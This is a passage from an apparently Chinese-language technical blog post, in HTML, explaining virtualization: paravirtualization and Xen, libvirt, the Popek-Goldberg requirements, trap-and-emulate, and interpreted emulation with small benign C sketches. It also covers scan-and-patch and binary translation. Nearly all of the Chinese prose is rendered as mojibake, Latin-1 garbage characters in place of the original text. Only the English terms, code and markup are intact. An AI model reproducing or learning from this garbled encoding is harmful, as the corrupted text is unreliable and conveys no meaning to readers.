æ¶æ„ä¸‹å®ç°è™šæ‹ŸåŒ–ã€‚åœ¨åŠè™šæ‹ŸåŒ–æŠ€æœ¯ä¸­ï¼ŒGuest OS èƒ½å¤Ÿæ„ŸçŸ¥åˆ°è‡ªå·±è¿è¡Œåœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­ï¼Œå½“æ¶‰åŠåˆ°æ•æ„ŸæŒ‡ä»¤çš„æ‰§è¡Œæˆ–æ˜¯å¯¹æ•æ„Ÿèµ„æºçš„è®¿é—®æ—¶ï¼ŒGuest OS é€šè¿‡åä¸º <code>Hypercall</code> çš„ API é™·å…¥ VMM ä¸­ï¼ˆé€šå¸¸é€šè¿‡é™·é˜±ç­‰æ–¹å¼å®ç°ï¼‰ï¼Œç”± VMM è¿›è¡Œç›¸åº”çš„æ“ä½œåå†é‡æ–°è¿”å› VM ä¸­çš„ Guest OS ç»§ç»­æ‰§è¡Œ</p><p><img src="https://s2.loli.net/2022/08/05/MhAJEnmCSBzoUVW.png" alt="image.png"></p><blockquote><p>Xen ä¾¿æ˜¯é‡‡ç”¨äº†è¿™ä¸€æ¨¡å¼çš„è™šæ‹ŸåŒ–è½¯ä»¶</p></blockquote><p>åŠè™šæ‹ŸåŒ–éœ€è¦å¯¹ OS kernel çš„ä»£ç è¿›è¡Œ<strong>å¤§é‡çš„ä¿®æ”¹</strong>ï¼Œä»è€Œä½¿å¾—å…¶æ”¯æŒåŠè™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå› æ­¤ Windows è¿™æ ·çš„é—­æºæ“ä½œç³»ç»Ÿæœ€åˆæ˜¯ä¸æ”¯æŒåŠè™šæ‹ŸåŒ–çš„</p><h2 id="å››ã€libvirt">å››ã€libvirt</h2><p>ä¼—æ‰€å‘¨çŸ¥ç³»ç»Ÿè™šæ‹ŸåŒ–å¹³å°ä¸æ­¢ä¸€ç§ï¼ˆVMWareã€Xenã€KVMã€â€¦ï¼‰ï¼Œç®¡ç†èµ·æ¥è¾ƒä¸ºéº»çƒ¦ï¼Œå› æ­¤ <strong>libvirt</strong> åº”è¿è€Œç”Ÿ</p><p><code>libvirt</code> æ˜¯ä¸€ä¸ª<strong>ä¸“é—¨ç”¨äºç®¡ç†è™šæ‹ŸåŒ–å¹³å°çš„å·¥å…·åŒ…</strong>ï¼Œå…¶æä¾›äº†ç”¨äºç®¡ç†ç¡¬ä»¶è™šæ‹ŸåŒ–çš„<strong>å¼€æºAPI</strong>ï¼ˆlibvirt APIï¼‰ã€<strong>å®ˆæŠ¤è¿›ç¨‹</strong>ï¼ˆlibvirtdï¼‰ä¸<strong>ç®¡ç†å·¥å…·</strong>ï¼ˆvirshï¼‰ï¼Œå¯ä»¥ç”¨äºç®¡ç†ç°åœ¨ä¸»æµçš„å¤§éƒ¨åˆ† VMMï¼š</p><p><img src="https://s2.loli.net/2022/08/08/tUSvuapWKl6dx9z.png" alt="image.png"></p><h1>0x03. CPU è™šæ‹ŸåŒ–</h1><p>CPU è™šæ‹ŸåŒ–æ˜¯ç³»ç»Ÿè™šæ‹ŸåŒ–æŠ€æœ¯ä¸­æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œå› ä¸º CPU æ˜¯è®¡ç®—æœºä¸­æœ€æ ¸å¿ƒçš„ç»„ä»¶ï¼Œç›´æ¥æ§åˆ¶ç€æ•´ä¸ªç³»ç»Ÿçš„è¿è¡Œï¼ŒåŒæ—¶å†…å­˜è®¿é—®ï¼ˆå†…å­˜è™šæ‹ŸåŒ–ï¼‰ä¸ I/O æ“ä½œï¼ˆI/Oè™šæ‹ŸåŒ–ï¼‰ä¹Ÿéƒ½ç›´æ¥ä¾èµ–äº CPUï¼Œå› æ­¤ CPU è™šæ‹ŸåŒ–æ˜¯ç³»ç»Ÿè™šæ‹ŸåŒ–æŠ€æœ¯ä¸­çš„æ ¸å¿ƒ</p><p>åœ¨ Gerald J. Popek ä¸ Robert P. Goldberg çš„åˆä½œè®ºæ–‡<a href="https://dl.acm.org/doi/pdf/10.1145/361011.361073">ã€ŠFormal Requirements for Virtualizable Third Generation Architecturesã€‹</a> ä¸­æå‡ºäº†æ»¡è¶³è™šæ‹ŸåŒ–ç³»ç»Ÿç»“æ„çš„ VMM çš„ä¸‰ä¸ªå……åˆ†æ¡ä»¶ï¼šç­‰ä»·æ€§ï¼Œèµ„æºæ§åˆ¶ï¼Œæ•ˆç‡æ€§ã€‚ä¸ºäº†æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œ CPU è™šæ‹ŸåŒ–ä½¿ç”¨çš„ç»å…¸æ¨¡å‹æ˜¯ã€ŒTrap &amp; Emulateã€ï¼Œä½¿ç”¨<strong>ç‰¹æƒçº§å‹ç¼©</strong>ï¼ˆRing Compressionï¼‰çš„æ–¹å¼æ¥å®ç°è™šæ‹Ÿç¯å¢ƒï¼š</p><ul><li>Hypervisor è¿è¡Œåœ¨æœ€é«˜ç‰¹æƒçº§ä¸Šï¼ŒGuest VM è¿è¡Œåœ¨ä½ç‰¹æƒçº§ä¸Šï¼ŒGuest VM åœ¨ç¡¬ä»¶ä¸Šç›´æ¥æ‰§è¡Œéæ•æ„ŸæŒ‡ä»¤ï¼Œå½“ Guest VM æ‰§è¡Œåˆ°æ•æ„ŸæŒ‡ä»¤æ—¶ï¼Œå…¶ä¾¿ä¼šé™·å…¥ä½äºæœ€é«˜ç‰¹æƒçº§çš„ Hypervisor ï¼Œæ­¤æ—¶ä¾¿èƒ½ç”± Hypervisor æ¨¡æ‹Ÿæ•æ„ŸæŒ‡ä»¤çš„è¡Œä¸º</li><li>å½“å‘ç”Ÿ virtual CPU è°ƒåº¦æ—¶ï¼Œæˆ‘ä»¬å°† vCPU çš„çŠ¶æ€ä¿å­˜ï¼Œæ¢å¤ Hypervisor çŠ¶æ€ï¼ŒHypervisor å®Œæˆå…¶è¡Œä¸ºåè¿›è¡Œä¸‹ä¸€ virtual CPU çš„è°ƒåº¦ï¼Œæ¢å¤ä¸‹ä¸€ vCPU çš„çŠ¶æ€å¹¶æ¢å¤æ‰§è¡Œ</li></ul><p><img src="https://s2.loli.net/2022/08/11/SvO9ewNdxIbsLqV.png" alt="image.png"></p><h2 id="ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–">ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–</h2><p>å‰æ–‡æˆ‘ä»¬å·²ç»æŒ‡å‡º x86 æ¶æ„å­˜åœ¨<strong>éç‰¹æƒæ•æ„ŸæŒ‡ä»¤ï¼Œç›´æ¥å¯¼è‡´ VMM æ— æ³•æˆªè· x86 VM çš„æ•æ„Ÿè¡Œä¸º</strong>ï¼Œè¿™è¿åäº†<code>Popek and Goldberg virtualization requirements</code>ï¼Œå› æ­¤åœ¨ç¡¬ä»¶å¯¹è™šæ‹ŸåŒ–çš„æ”¯æŒå‡ºç°ä¹‹å‰ï¼Œè™šæ‹ŸåŒ–å‚å•†åªå¥½å…ˆä»è½¯ä»¶å±‚é¢ä¸‹æ‰‹</p><h3 id="I-æ¨¡æ‹Ÿ-è§£é‡Šæ‰§è¡Œ">I. æ¨¡æ‹Ÿ &amp; è§£é‡Šæ‰§è¡Œ</h3><p><strong>ã€Œæ¨¡æ‹Ÿã€</strong>ï¼ˆEmulateï¼‰æŠ€æœ¯çš„å‡ºç°å…¶å®æ—©äºè™šæ‹ŸåŒ–ï¼Œçº¯è½¯ä»¶çš„æ¨¡æ‹Ÿæœ¬è´¨ä¸Šå°±æ˜¯é€šè¿‡ç¼–å†™èƒ½å¤Ÿå‘ˆç°å‡ºä¸è¢«æ¨¡æ‹Ÿå¯¹è±¡ç›¸åŒè¡Œä¸ºçš„åº”ç”¨ç¨‹å¼ä»è€Œè¾¾åˆ°è¿è¡ŒéåŒæ„å¹³å°åº”ç”¨ç¨‹åºçš„æ•ˆæœ</p><p>æ¨¡æ‹ŸæŠ€æœ¯ä¸ä»…èƒ½å¤Ÿåº”ç”¨äºç¨‹åºçº§åˆ«çš„æ¨¡æ‹Ÿï¼Œè¿˜èƒ½åº”ç”¨äºç³»ç»Ÿçº§åˆ«çš„æ¨¡æ‹Ÿï¼šCPU è¿è¡Œçš„æœ¬è´¨è¡Œä¸ºå…¶å®å°±æ˜¯<strong>ä» PC å¯„å­˜å™¨æ‰€æŒ‡å†…å­˜åŒºåŸŸä¸­ä¸æ–­å–å‡ºæŒ‡ä»¤è§£ç æ‰§è¡Œ</strong>ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œå®ç°ä¸€ä¸ªè™šæ‹Ÿæœºæœ€ç®€å•ç²—æš´çš„æ–¹æ³•ä¾¿æ˜¯é€šè¿‡<strong>æ¨¡æ‹Ÿæ¯ä¸€æ¡æŒ‡ä»¤å¯¹åº”çš„è¡Œä¸ºï¼Œä»è€Œä½¿å¾— VM çš„è¡Œä¸ºå¯¹ VMM è€Œè¨€æ˜¯å®Œå…¨å¯æ§çš„</strong></p><blockquote><p>ä¾‹å¦‚ï¼Œå¯¹äº <code>mov rax, rbx</code> è¿™æ ·çš„æŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ç¨‹åºæ¥æ¨¡æ‹Ÿï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">x86_regs</span>&#123;</span><br>    <span class="hljs-type">uint64_t</span> rax;<br>    <span class="hljs-type">uint64_t</span> rbx;<br>    <span class="hljs-type">uint64_t</span> rcx;<br>    <span class="hljs-type">uint64_t</span> rdx;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">mov_regs</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> *to, <span class="hljs-type">uint64_t</span> *from)</span><br>&#123;<br>    *to = *from;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">mov_rax_rbx</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> x86_regs *regs)</span><br>&#123;<br>    mov_regs(&amp;regs-&gt;rax, &amp;regs-&gt;rbx);<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>å®ç°æ¨¡æ‹ŸæŠ€æœ¯çš„åŸç†ä¹Ÿæ˜¯æœ€ç®€å•çš„â€”â€”æˆ‘ä»¬å¯ä»¥é€šè¿‡**ã€Œè§£é‡Šæ‰§è¡Œã€**çš„æ–¹å¼æ¥å®ç°æ¨¡æ‹ŸæŠ€æœ¯ï¼š</p><ul><li>æ¨¡æ‹Ÿå™¨ç¨‹åºä¸æ–­åœ°ä»å†…å­˜ä¸­è¯»å–æŒ‡ä»¤ï¼Œå¹¶æ¨¡æ‹Ÿå‡ºæ¯ä¸€æ¡æŒ‡ä»¤çš„æ•ˆæœï¼Œå‘¨è€Œå¤å§‹</li></ul><p>è¿™æ ·ï¼Œä»æŸç§ç¨‹åº¦è€Œè¨€ï¼Œ<strong>æ¯ä¸€æ¡æŒ‡ä»¤åœ¨æ‰§è¡Œæ—¶éƒ½å®Œæˆäº†â€œé™·å…¥â€</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¨¡æ‹ŸæŠ€æœ¯è§£å†³è™šæ‹ŸåŒ–çš„æ¼æ´ï¼ŒåŒæ—¶è¿˜èƒ½æ¨¡æ‹Ÿä¸ç‰©ç†æœºä¸åŒæ¶æ„çš„è™šæ‹Ÿæœº</p><p><img src="https://s2.loli.net/2022/08/12/ZCSrkJIfeihDRwF.png" alt="image.png"></p><p><strong>Qemu</strong>â€”â€”<code>Quick Emulator</code> æœ¬è´¨ä¸Šä¾¿æ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿå™¨ï¼Œå…¶<strong>å®Œæ•´åœ°æ¨¡æ‹Ÿäº†ä¸€å¥—åŒ…æ‹¬å„ç§å¤–è®¾åœ¨å†…çš„è®¡ç®—æœºç³»ç»Ÿ</strong></p><blockquote><p>ä¾‹å¦‚ä»¥ä¸‹ä¾¿æ˜¯ç¬”è€…å®ç°çš„ä¸€ä¸ªæœ€æœ€æœ€æœ€ç®€é™‹çš„æ¨¡æ‹Ÿå™¨æ¶æ„ï¼Œå®é™…çš„æ¶æ„ä¼šæ¯”è¿™å¤æ‚å¾—å¤šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CPU</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">regs</span> <span class="hljs-title">regs</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu</span> *<span class="hljs-title">cpu</span>[];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">memory</span> *<span class="hljs-title">mm</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bus</span> *<span class="hljs-title">bus</span>;</span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">start_a_new_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> disk *disk)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span> <span class="hljs-title">vm</span> =</span> new_vm(<span class="hljs-string">&quot;x86&quot;</span>, disk);<br>    <br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">instruction</span> <span class="hljs-title">insn</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exec_result</span> <span class="hljs-title">res</span>;</span><br>        <br>        fetch_next_insn(vm, &amp;insn);<br>        vm_exec_insn(vm, &amp;insn, &amp;res);<br><br>        <span class="hljs-keyword">switch</span> (res.type) &#123;<br>            <span class="hljs-keyword">case</span> EXIT_VM:<br>                vm_stop(vm);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> RESOURCE_ACCESS:<br>                vm_access_resource(vm, &amp;res);<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>ä¸è¿‡åŸºäºè§£é‡Šæ‰§è¡Œçš„æ¨¡æ‹ŸæŠ€æœ¯æœ‰ç€ä¸€ä¸ªéå¸¸è‡´å‘½çš„ç¼ºç‚¹â€”â€”<strong>æ€§èƒ½æå·®</strong>ï¼Œå› ä¸ºæ¯ä¸€æ¡æŒ‡ä»¤éƒ½éœ€è¦ç»è¿‡ VMM çš„è§£æåå†ç”± VMM æ¨¡æ‹Ÿæ‰§è¡Œï¼Œå“ªæ€•æœ€ç®€å•çš„ä¸€æ¡æŒ‡ä»¤ä¹Ÿå¯èƒ½éœ€è¦åˆ†è§£æˆå¤šä¸ªæ­¥éª¤ä¸å¤šæ¬¡å†…å­˜è®¿é—®ï¼Œæ•ˆç‡æä½</p><p>è®©æˆ‘ä»¬é‡æ–°å®¡è§†æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦åœ¨ x86 æ¶æ„ä¸Šä½¿ç”¨æ¨¡æ‹ŸæŠ€æœ¯æ¥å®ç°è™šæ‹Ÿæœºï¼šéç‰¹æƒæ•æ„ŸæŒ‡ä»¤çš„å­˜åœ¨æ‰“ç ´äº† <code>Popek and Goldberg virtualization requirements</code>ï¼Œä½†<strong>éç‰¹æƒæ•æ„ŸæŒ‡ä»¤ä»…æ˜¯å°‘æ•°ï¼Œå¤§éƒ¨åˆ†æŒ‡ä»¤æˆ‘ä»¬ä»èƒ½ç›´æ¥åœ¨ç‰©ç†ç¡¬ä»¶ä¸Šè¿è¡Œ</strong>ï¼Œå› æ­¤åŸºäºæ¨¡æ‹ŸæŠ€æœ¯è¿›è¡Œæ”¹è¿›çš„è™šæ‹ŸåŒ–æŠ€æœ¯å‡ºç°äº†ï¼š<code>æ‰«æ &amp; ä¿®è¡¥</code> ä¸ <code>äºŒè¿›åˆ¶ç¿»è¯‘</code></p><h3 id="II-æ‰«æ-ä¿®è¡¥">II. æ‰«æ &amp; ä¿®è¡¥</h3><p>è™šæ‹ŸåŒ–åœºæ™¯ä¸‹çš„è™šæ‹Ÿæœºå¤§éƒ½æ˜¯ä¸ç‰©ç†æœºæœ‰ç€ç›¸åŒçš„ ISAï¼Œå› æ­¤æˆ‘ä»¬å¹¶æ²¡æœ‰å¿…è¦é‡‡ç”¨çº¯æ¨¡æ‹Ÿçš„æŠ€æœ¯å®ç°è™šæ‹Ÿæœºï¼Œè€Œæ˜¯å¯ä»¥<strong>è®©éæ•æ„ŸæŒ‡ä»¤ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œï¼Œé€šè¿‡æŸç§æ–¹å¼è®©éç‰¹æƒæ•æ„ŸæŒ‡ä»¤é™·å…¥ VMM</strong>ï¼Œä»è€Œé‡æ–°å®ç° Trap &amp; Emulate æ¨¡å‹</p><p><strong>ã€Œæ‰«æ &amp; ä¿®è¡¥ã€<strong>ä¾¿æ˜¯è¿™æ ·çš„ä¸€ç§æŠ€æœ¯ï¼Œå…¶</strong>è®©éæ•æ„ŸæŒ‡ä»¤ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œ</strong>ï¼ŒåŒæ—¶<strong>å°†ç³»ç»Ÿä»£ç ä¸­çš„æ•æ„ŸæŒ‡ä»¤æ›¿æ¢ä¸ºè·³è½¬æŒ‡ä»¤ç­‰èƒ½é™·å…¥ VMM ä¸­çš„æŒ‡ä»¤</strong>ï¼Œä»è€Œè®© VM åœ¨æ‰§è¡Œæ•æ„ŸæŒ‡ä»¤æ—¶èƒ½é™·å…¥ VMMï¼Œä½¿å¾— VMM èƒ½å¤Ÿæ¨¡æ‹Ÿæ‰§è¡Œæ•æ„ŸæŒ‡ä»¤çš„æ•ˆæœ</p><p>ã€Œæ‰«æ &amp; ä¿®è¡¥ã€çš„åŸºæœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>VMM åœ¨ VM æ‰§è¡Œæ¯æ®µä»£ç ä¹‹å‰å¯¹å…¶è¿›è¡Œæ‰«æï¼Œè§£ææ¯ä¸€æ¡æŒ‡ä»¤ï¼ŒæŸ¥æ‰¾ç‰¹æƒä¸æ•æ„ŸæŒ‡ä»¤</li><li>VMM åŠ¨æ€ç”Ÿæˆç›¸åº”æŒ‡ä»¤çš„è¡¥ä¸ä»£ç ï¼Œå¹¶å°†åŸæ•æ„ŸæŒ‡ä»¤æ›¿æ¢ä¸ºä¸€ä¸ªå¤–è·³è½¬ä»¥é™·å…¥ VMMï¼Œä»è€Œåœ¨ VMM ä¸­æ‰§è¡ŒåŠ¨æ€ç”Ÿæˆçš„è¡¥ä¸ä»£ç </li><li>è¡¥ä¸ä»£ç æ‰§è¡Œç»“æŸåï¼Œå†è·³è½¬å› VM ä¸­ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡ä»£ç </li></ul><p><img src="https://s2.loli.net/2022/08/12/3ZlrC9zkLpJIvGO.png" alt="image.png"></p><blockquote><p>ä¾‹å¦‚è¿™æ˜¯ VirtualBox ä¸­å¯¹ <code>cli</code> æŒ‡ä»¤è¿›è¡Œæ¨¡æ‹Ÿçš„ä»£ç ï¼š</p><p><img src="https://s2.loli.net/2022/08/12/IFMhNz16xSneOq4.png" alt="image.png"></p></blockquote><p>åœ¨ã€Œæ‰«æ &amp; ä¿®è¡¥ã€æŠ€æœ¯å½“ä¸­å¤§éƒ¨åˆ†çš„ä»£ç éƒ½å¯ä»¥ç›´æ¥åœ¨ç‰©ç† CPU ä¸Šè¿è¡Œï¼Œå…¶æ€§èƒ½æŸå¤±è¾ƒå°ï¼Œä½†ã€Œæ‰«æ &amp; ä¿®è¡¥ã€åŒæ ·å­˜åœ¨ç€ä¸€å®šçš„ç¼ºé™·ï¼š</p><ul><li><p>ç‰¹æƒæŒ‡ä»¤ä¸æ•æ„ŸæŒ‡ä»¤ä»é€šè¿‡æ¨¡æ‹Ÿæ‰§è¡Œçš„æ–¹å¼å®Œæˆï¼Œä»å¯èƒ½é€ æˆä¸€å®šçš„æ€§èƒ½æŸå¤±</p></li><li><p>ä»£ç è¡¥ä¸å½“ä¸­å¼•å…¥äº†é¢å¤–çš„è·³è½¬ï¼Œè¿™ç ´åäº†ä»£ç çš„å±€éƒ¨æ€§</p><blockquote><p>å±€éƒ¨æ€§åŸç†ï¼šCPUå­˜å–æŒ‡ä»¤/æ•°æ®çš„å†…å­˜å•å…ƒåº”å½“è¶‹å‘äºèšé›†åœ¨ä¸€ä¸ªè¾ƒå°çš„åŒºåŸŸ</p></blockquote></li><li><p>VMM éœ€è¦ç»´æŠ¤ä¸€ä»½è¡¥ä¸ä»£ç å¯¹åº”çš„åŸå§‹ä»£ç çš„å‰¯æœ¬ï¼Œè¿™é€ æˆäº†é¢å¤–çš„å¼€é”€</p></li></ul><h3 id="III-äºŒè¿›åˆ¶ç¿»è¯‘">III. äºŒè¿›åˆ¶ç¿»è¯‘</h3><p>ä¸ºäº†è¿›ä¸€æ­¥åœ°æé«˜è™šæ‹ŸåŒ–çš„æ€§èƒ½ï¼Œ<strong>ã€ŒäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘ã€</strong>ï¼ˆBinary Translationï¼‰æŠ€æœ¯åº”è¿è€Œç”Ÿï¼Œç±»ä¼¼äºã€Œæ‰«æ &amp; ä¿®è¡¥ã€æŠ€æœ¯ï¼ŒäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘åŒæ ·ä¼šåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°ä¿®æ”¹ä»£ç ï¼Œä¸è¿‡ä¸åŒçš„æ˜¯ BT æŠ€æœ¯ä»¥<strong>åŸºæœ¬å—</strong>ï¼ˆåªæœ‰ä¸€ä¸ªå…¥å£å’Œä¸€ä¸ªå‡ºå£çš„ä»£ç å—ï¼‰ä½œä¸ºç¿»è¯‘çš„å•ä½ï¼š</p><ul><li>Emulator å¯¹è¯»å…¥çš„äºŒè¿›åˆ¶ä»£ç <strong>ç¿»è¯‘</strong>è¾“å‡ºä¸ºå¯¹åº” ISA çš„ä¸€ä¸ª<strong>ä¸åŒ…å«ç‰¹æƒæŒ‡ä»¤ä¸æ•æ„ŸæŒ‡ä»¤çš„å­é›†</strong>æ‰€æ„æˆçš„ä»£ç ï¼Œä½¿å…¶å¯ä»¥åœ¨ç”¨æˆ·æ€ä¸‹å®‰å…¨è¿è¡Œ</li><li>Emulator åŠ¨æ€åœ°ä¸ºå½“å‰è¦è¿è¡Œçš„åŸºæœ¬å—å¼€è¾Ÿä¸€å—ç©ºé—´ï¼Œç§°ä¹‹ä¸º<strong>ç¿»è¯‘ç¼“å­˜</strong>ï¼ˆtranslation cacheï¼‰ï¼Œåœ¨å…¶ä¸­å­˜æ”¾ç€ç¿»è¯‘åçš„ä»£ç ï¼Œæ¯ä¸€å— TC ä¸åŸä»£ç ä»¥æŸç§æ˜ å°„å…³ç³»ï¼ˆä¾‹å¦‚å“ˆå¸Œè¡¨ï¼‰è¿›è¡Œå…³è”</li></ul><p><img src="https://s2.loli.net/2022/08/14/hBFr6MSf5ZvtJkH.png" alt="image.png"></p><blockquote><p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯ä¸æ‰«æä¿®è¡¥æŠ€æœ¯çš„åŸç†å¤§ä½“ä¸Šæ˜¯éå¸¸ç±»ä¼¼çš„ï¼Œä½†æ˜¯äºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯ä¼šå¯¹æ‰€æœ‰çš„ä»£ç è¿›è¡Œç¿»è¯‘ï¼Œè€Œæ‰«æä¸ä¿®è¡¥æŠ€æœ¯åˆ™åªä¼š patch æ‰æ•æ„ŸæŒ‡ä»¤ä¸ç‰¹æƒæŒ‡ä»¤ï¼›åŒæ—¶æ‰«æ&amp;ä¿®è¡¥æŠ€æœ¯<strong>ä¸ä¼šæ”¹å˜ä»£ç çš„æ•´ä½“ç»“æ„</strong>ï¼Œè€Œä»…æ˜¯å°†æ•æ„Ÿä¸ç‰¹æƒæŒ‡ä»¤æ›¿æ¢ä¸ºèƒ½è§¦å‘é™·å…¥ VMM çš„æŒ‡ä»¤ï¼Œä½†æ˜¯äºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯<strong>ä¼šç›´æ¥æ”¹å˜ä¸€ä¸ªåŸºæœ¬å—çš„ä»£ç æ•´ä½“ç»“æ„</strong>ï¼ˆä¾‹å¦‚ç¿»è¯‘å‰åŸºæœ¬å—å¯èƒ½é•¿åº¦ 40Bï¼Œç¿»è¯‘åå˜æˆ100Bï¼Œå†…éƒ¨ä»£ç çš„ç›¸å¯¹ä½ç½®ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼‰</p></blockquote><p>Emulator çš„ç¿»è¯‘æ–¹æ³•å¤§è‡´åˆ†ä¸ºä¸¤ç±»ï¼š<strong>ç®€å•ç¿»è¯‘</strong>ä¸<strong>ç­‰å€¼ç¿»è¯‘</strong>ï¼š</p><ul><li>ç®€å•ç¿»è¯‘å¯ä»¥ç›´æ¥ç†è§£ä¸º<strong>ç­‰æ•ˆä»£ç æ¨¡æ‹Ÿ</strong>ã€‚è¿™ç§æ–¹æ³•å®ç°è¾ƒä¸ºç®€å•ï¼Œä½†æ˜¯ä¼šè®©æŒ‡ä»¤æ•°é‡å¤§å¹…è†¨èƒ€</li><li>ç­‰å€¼ç¿»è¯‘åˆ™æ˜¯<strong>åŸä»£ç ä¸ç»“æœä»£ç ç›¸åŒ</strong>ã€‚ç†è®ºä¸Šå¤§å¤šæ•°æŒ‡ä»¤éƒ½å¯ä»¥ä½¿ç”¨ç­‰å€¼ç¿»è¯‘ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œï¼Œä½†è¿™éœ€è¦æ›´å¤æ‚çš„åŠ¨æ€åˆ†ææŠ€æœ¯</li></ul><p>åœ¨ç›¸åŒ ISA æ¶æ„ä¸Šå¤§éƒ¨åˆ†æŒ‡ä»¤éƒ½æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œç­‰å€¼ç¿»è¯‘çš„ï¼Œé™¤äº†ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>PC ç›¸å¯¹å¯»å€æŒ‡ä»¤ã€‚è¿™ç±»æŒ‡ä»¤çš„å¯»å€ä¸ PC ç›¸å…³ï¼Œä½†åœ¨è¿›è¡ŒäºŒè¿›åˆ¶ç¿»è¯‘åæ›´æ”¹äº†ä»£ç åŸºæœ¬å—çš„ç»“æ„ï¼Œå› æ­¤è¿™ç±»æŒ‡ä»¤éœ€è¦é¢å¤–æ’å…¥ä¸€äº›è¡¥å¿ä»£ç æ¥ç¡®ä¿å¯»å€çš„å‡†ç¡®ï¼Œè¿™é€ æˆäº†ä¸€å®šçš„æ€§èƒ½æŸå¤±</li><li>ç›´æ¥æ§åˆ¶è½¬æ¢ã€‚è¿™ç±»æŒ‡ä»¤åŒ…æ‹¬å‡½æ•°è°ƒç”¨ä¸è·³è½¬æŒ‡ä»¤ï¼Œå…¶ç›®æ ‡åœ°å€éœ€è¦è¢«æ›¿æ¢ä¸ºç”Ÿæˆä»£ç çš„åœ°å€</li><li>é—´æ¥æ§åˆ¶è½¬æ¢ã€‚è¿™ç±»æŒ‡ä»¤åŒ…æ‹¬é—´æ¥è°ƒç”¨ã€è¿”å›ã€é—´æ¥è·³è½¬ï¼Œå…¶ç›®æ ‡åœ°å€æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€å¾—åˆ°çš„ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•åœ¨ç¿»è¯‘æ—¶ç¡®å®šè·³è½¬ç›®æ ‡</li><li>ç‰¹æƒæŒ‡ä»¤ã€‚å¯¹äºç®€å•çš„ç‰¹æƒæŒ‡ä»¤å¯ä»¥ç›´æ¥ç¿»è¯‘ä¸ºç±»ä¼¼çš„ç­‰å€¼ä»£ç ï¼ˆä¾‹å¦‚ cli 